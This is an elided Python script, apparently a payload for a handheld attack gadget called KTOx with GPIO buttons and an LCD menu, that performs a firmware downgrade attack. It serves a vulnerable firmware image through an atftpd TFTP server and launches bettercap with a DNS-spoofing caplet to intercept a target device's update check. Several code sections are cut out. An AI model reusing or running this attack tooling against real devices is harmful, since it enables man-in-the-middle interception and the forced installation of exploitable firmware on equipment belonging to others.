#!/usr/bin/env python3
"""
KTOx *payload* – **Firmware Downgrade Attack**
====================================================
This payload performs a Firmware Downgrade attack by tricking a target
device into downloading and installing a vulnerable firmware version.

**NOTE:** This is a very advanced attack that requires a deep
understanding of the target device and its firmware update process.

Features:
- Hosts a vulnerable firmware image using a TFTP server.
- Performs a man-in-the-middle attack to intercept the device's
  update check.
...
- MAIN SCREEN:
    ...
    - KEY2: Edit the firmware image path.
    - KEY3: Exit Payload.
"""
...
def cleanup(*_):
    ...
    subprocess.run("killall atftpd", shell=True)
    subprocess.run("killall bettercap", shell=True)
...
def draw_ui(screen_state="main", message_lines=None):
    ...
    d.text((5, 5), "Firmware Downgrade", font=FONT_TITLE, fill=(30, 132, 73))
    ...
    if message_lines:
        ...
        d.text((5, 50), f"Firmware: {os.path.basename(FIRMWARE_IMAGE)}", font=FONT, fill=(242, 243, 244))
        d.text((5, 100), "OK=Start", font=FONT, fill=(171, 178, 185))
        d.text((5, 110), "KEY1=Iface | KEY2=Firmware", font=FONT, fill=(171, 178, 185))
        ...
        d.text((5, 85), f"Firmware: {os.path.basename(FIRMWARE_IMAGE)}", font=FONT, fill=(242, 243, 244))
...
def run_attack():
    ...
    # Start TFTP server
    tftp_dir = os.path.dirname(FIRMWARE_IMAGE)
    tftp_file = os.path.basename(FIRMWARE_IMAGE)
    subprocess.Popen(f"atftpd --daemon --port 69 --tftpd-path {tftp_dir}", shell=True)
...
dns.spoof on
"""
    with open("/tmp/firmware_downgrade.cap", "w") as f:
        f.write(caplet)
        
    # Start the attack
    subprocess.Popen(f"bettercap -iface {INTERFACE} -caplet /tmp/firmware_downgrade.cap", shell=True)
...
if __name__ == "__main__":
    try:
        while running:
            ...
            if GPIO.input(PINS["KEY2"]) == 0:
                new_firmware = handle_text_input_logic(FIRMWARE_IMAGE, "Firmware Image")
                if new_firmware:
                    FIRMWARE_IMAGE = new_firmware
                time.sleep(0.3)
        ...
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Firmware Downgrade Attack payload finished.")
